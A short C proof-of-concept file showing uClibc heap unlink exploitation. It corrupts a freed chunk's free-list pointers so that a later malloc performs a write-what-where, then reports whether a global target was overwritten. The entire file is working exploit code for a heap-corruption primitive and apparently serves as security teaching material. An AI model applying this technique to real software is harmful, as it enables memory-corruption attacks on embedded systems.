// Based on https://blog.infosectcbr.com.au/2019/11/uclibc-unlink-heap-exploitation.html
// by Dr Silvio Cesare

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>

#ifndef __UCLIBC__
#error "Wrong libc - needs uClibc"
#endif

void *uclibc_malloc(size_t size) {
  return malloc(size);
}

void uclibc_free(void *ptr) {
  free(ptr);
}

struct heap_free_area {
  size_t size;
  struct heap_free_area *next, *prev;
};

long *real_target;
long foo;

int main() {

  char *p = uclibc_malloc(10);
  char *q = uclibc_malloc(10);

  // Insert into free list
  uclibc_free(p);

  real_target = NULL;
  foo = 0x41414141424242;

  struct heap_free_area * fa1 = (void *) (p - sizeof(void*));
  fa1->prev = (void *) &foo; // What
  fa1->next = (void *) (&real_target - 2); // Where

  q = uclibc_malloc(10); // write-what-where

  if (real_target) {
    printf("Target overwritten, points to value %lx\n", *real_target);
  } else {
    printf("Target NOT overwritten\n");
  }
}